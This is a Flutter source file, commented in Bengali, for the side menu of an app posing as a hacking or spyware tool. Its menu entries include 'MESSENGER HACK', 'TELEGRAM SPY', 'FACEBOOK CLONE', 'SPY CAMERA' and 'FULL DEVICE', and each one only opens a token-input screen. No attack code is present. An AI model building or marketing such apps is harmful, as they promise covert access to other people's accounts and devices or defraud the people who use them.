import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../constants.dart';
import '../screens/login_screen.dart';
import '../screens/input_token_screen.dart';
import '../screens/support_screen.dart'; // ✅ নতুন সাপোর্ট পেজ ইম্পোর্ট

class HackerDrawer extends StatefulWidget {
  const HackerDrawer({super.key});

  @override
  State<HackerDrawer> createState() => _HackerDrawerState();
}

class _HackerDrawerState extends State<HackerDrawer> {
  String username = "Anonymous"; // ডিফল্ট নাম

  // --- ইমেজ কনফিগারেশন ---
  final Map<String, String> _serviceImages = {
    'messenger': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNoG9imdTijPu9J1dEhynHfo7WaV4beIjBiQ&s',
    'whatsapp': 'https://static0.anpoimages.com/wordpress/wp-content/uploads/2022/04/WhatsApp-generic-hero-app-interface.jpg',
    'telegram': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUJju0Wixdi3CVeS1TRPlkFbcYDcPHj_xM9w&s',
    'instagram': 'https://images.squarespace-cdn.com/content/v1/5ccdce16cf9f386f5cc7dc85/fbe1c3cb-d566-4d2f-ade7-716b12b23b90/profile-pics-for-Instagram-profile-pics-for-IG-isabel-talens-36.jpg',
    'facebook': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGfaa2IlatyXU2GvnAgEya0cqxcxnoT-nB-Q&s',
    'file_manager': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhJfkVIMlvFTHi1AX3qFKgp3yax9xVTHHz-A&s',
    'gallery': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBOgeOFg8Ww7_MXZT1A2oVSCHE0yMFrPmDcA&s',
    'imo': 'https://static.filerox.com/android/imo-beta/screenshot-2.png',
    'tiktok': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSE8Q6-iz2eam9SLgo4V7kKUQUiF-D2B6fWrg&s',
    'remote': 'https://www.42gears.com/wp-content/uploads/2014/05/Remote-Capture-Click-Remote-from-the-Quick-Action-Toolbar1.png',
    'full_device': 'https://ubports.com/web/image/180634-011ce28b/stacks-image-94b7f4a%281%29.png',
    'google': 'https://images.ctfassets.net/lzny33ho1g45/3zl1cvd0K9BZgtPzV69dXM/4114d12a3958900466b2ce833e6c81a9/manage-multiple-gmail-accounts-03-gmail-account-added.webp',
    'call_logs': 'https://storage.googleapis.com/support-forums-api/attachment/message-243247620-13466872279101780486.jpg',
    'camera': 'https://i.redd.it/zvfub40xkjea1.jpg',
  };

  @override
  void initState() {
    super.initState();
    _loadUserData();
  }

  // --- ইউজারনেম লোড করা ---
  Future<void> _loadUserData() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      username = prefs.getString('username') ?? "Hacker";
    });
  }

  // --- অ্যাকশন হ্যান্ডলার ---
  void _handleMenuAction(BuildContext context, String serviceKey) async {
    Navigator.pop(context); // ড্রয়ার বন্ধ

    // ✅ ড্যাশবোর্ড কি (Key) আসলে সাপোর্ট পেজে যাবে
    if (serviceKey == 'support') {
      Navigator.push(context, MaterialPageRoute(builder: (_) => const SupportScreen()));
      return;
    }

    final prefs = await SharedPreferences.getInstance();
    final bool isLoggedIn = prefs.getBool('is_logged_in') ?? false;

    if (!isLoggedIn) {
      if (mounted) _showLoginRequiredDialog(context);
    } else {
      String imagePath = _serviceImages[serviceKey] ?? 'assets/images/images2.jpg';
      if (mounted) {
        Navigator.push(
          context,
          MaterialPageRoute(builder: (_) => InputTokenScreen(backgroundImage: imagePath)),
        );
      }
    }
  }

  // --- লগআউট হ্যান্ডলার ---
  void _handleLogout(BuildContext context) async {
    Navigator.pop(context);
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.black,
        shape: Border.all(color: Colors.red),
        title: const Text("সেশন বন্ধ করুন?", style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
        content: const Text("আপনি কি সার্ভার থেকে ডিসকানেক্ট হতে চান?", style: TextStyle(color: Colors.white)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("না", style: TextStyle(color: Colors.grey))),
          TextButton(
            onPressed: () async {
              Navigator.pop(context);
              final prefs = await SharedPreferences.getInstance();
              await prefs.clear();
              if (mounted) {
                Navigator.pushAndRemoveUntil(context, MaterialPageRoute(builder: (_) => const LoginScreen()), (route) => false);
              }
            },
            child: const Text("হ্যাঁ, করুন", style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showLoginRequiredDialog(BuildContext context) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.black,
        shape: Border.all(color: Colors.red),
        title: const Text("লগইন প্রয়োজন", style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
        content: const Text("এই টুলস ব্যবহার করতে লগইন করুন।", style: TextStyle(color: Colors.white)),
        actions: [
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
            onPressed: () {
              Navigator.pop(context);
              Navigator.push(context, MaterialPageRoute(builder: (_) => const LoginScreen()));
            },
            child: const Text("লগইন", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Drawer(
      child: Container(
        decoration: BoxDecoration(
          color: Colors.black,
          border: const Border(right: BorderSide(color: kPrimaryColor, width: 2)),
          boxShadow: [BoxShadow(color: kPrimaryColor.withOpacity(0.2), blurRadius: 20)],
        ),
        child: Column(
          children: [
            _buildHeader(),
            Expanded(
              child: ListView(
                padding: EdgeInsets.zero,
                children: [
                  _buildDivider(),
                  // ✅ নতুন সাপোর্ট বাটন
                  _buildMenuItem(context, icon: Icons.help_outline, title: "SUPPORT & TUTORIALS", key: 'support'),

                  _buildMenuItem(context, icon: Icons.message, title: "MESSENGER HACK", key: 'messenger'),
                  _buildMenuItem(context, icon: Icons.chat, title: "WHATSAPP ACCESS", key: 'whatsapp'),
                  _buildMenuItem(context, icon: Icons.send, title: "TELEGRAM SPY", key: 'telegram'),
                  _buildMenuItem(context, icon: Icons.camera_alt, title: "INSTAGRAM LOGIN", key: 'instagram'),
                  _buildMenuItem(context, icon: Icons.facebook, title: "FACEBOOK CLONE", key: 'facebook'),

                  _buildDivider(),

                  _buildMenuItem(context, icon: Icons.folder_open, title: "FILE MANAGER", key: 'file_manager'),
                  _buildMenuItem(context, icon: Icons.image, title: "GALLERY VIEWER", key: 'gallery'),
                  _buildMenuItem(context, icon: Icons.video_call, title: "IMO TRACKER", key: 'imo'),
                  _buildMenuItem(context, icon: Icons.tiktok, title: "TIKTOK ACCESS", key: 'tiktok'),
                  _buildMenuItem(context, icon: Icons.settings_remote, title: "REMOTE CONTROL", key: 'remote'),
                  _buildMenuItem(context, icon: Icons.phone_android, title: "FULL DEVICE", key: 'full_device'),

                  _buildDivider(),

                  _buildMenuItem(context, icon: Icons.g_mobiledata, title: "GOOGLE LOGS", key: 'google'),
                  _buildMenuItem(context, icon: Icons.call, title: "CALL HISTORY", key: 'call_logs'),
                  _buildMenuItem(context, icon: Icons.camera, title: "SPY CAMERA", key: 'camera', isWarning: true),
                ],
              ),
            ),
            _buildFooter(context),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.only(top: 50, bottom: 20),
      decoration: BoxDecoration(
        color: const Color(0xFF111111),
        border: Border(bottom: BorderSide(color: kPrimaryColor.withOpacity(0.5))),
      ),
      child: Column(
        children: [
          // ✅ লোগো বা প্রোফাইল ইমেজ
          Container(
            padding: const EdgeInsets.all(3),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(color: kPrimaryColor, width: 2),
            ),
            child: const CircleAvatar(
              radius: 40,
              backgroundColor: Colors.black,
              backgroundImage: AssetImage("assets/images/image1.jpg"),
              child: Icon(Icons.person, size: 40, color: Colors.grey),
            ),
          ),
          const SizedBox(height: 10),
          // ✅ ডাইনামিক ইউজারনেম
          Text(
            "WELCOME, $username",
            style: const TextStyle(color: kPrimaryColor, fontFamily: 'Courier', fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const Text(
            "STATUS: ENCRYPTED [ONLINE]",
            style: TextStyle(color: Colors.green, fontFamily: 'Courier', fontSize: 10),
          ),
        ],
      ),
    );
  }

  Widget _buildMenuItem(BuildContext context, {required IconData icon, required String title, required String key, bool isWarning = false}) {
    return ListTile(
      onTap: () => _handleMenuAction(context, key),
      contentPadding: const EdgeInsets.symmetric(horizontal: 20, vertical: 0),
      leading: Icon(icon, color: isWarning ? Colors.red : kPrimaryColor, size: 22),
      title: Text(
        title,
        style: TextStyle(
          color: isWarning ? Colors.redAccent : Colors.white,
          fontFamily: 'Courier',
          fontWeight: FontWeight.w600,
          fontSize: 14,
        ),
      ),
      trailing: Icon(Icons.arrow_forward_ios, size: 12, color: Colors.grey[800]),
      hoverColor: kPrimaryColor.withOpacity(0.1),
    );
  }

  Widget _buildFooter(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.black,
        border: Border(top: BorderSide(color: Colors.grey[800]!)),
      ),
      child: InkWell(
        onTap: () => _handleLogout(context),
        child: const Row(
          children: [
            Icon(Icons.power_settings_new, color: Colors.red),
            SizedBox(width: 10),
            Text("TERMINATE SESSION", style: TextStyle(color: Colors.red, fontFamily: 'Courier', fontWeight: FontWeight.bold)),
            Spacer(),
            Text("v3.0", style: TextStyle(color: Colors.grey, fontSize: 10)),
          ],
        ),
      ),
    );
  }

  Widget _buildDivider() {
    return Divider(color: kPrimaryColor.withOpacity(0.2), thickness: 1, indent: 20, endIndent: 20);
  }
}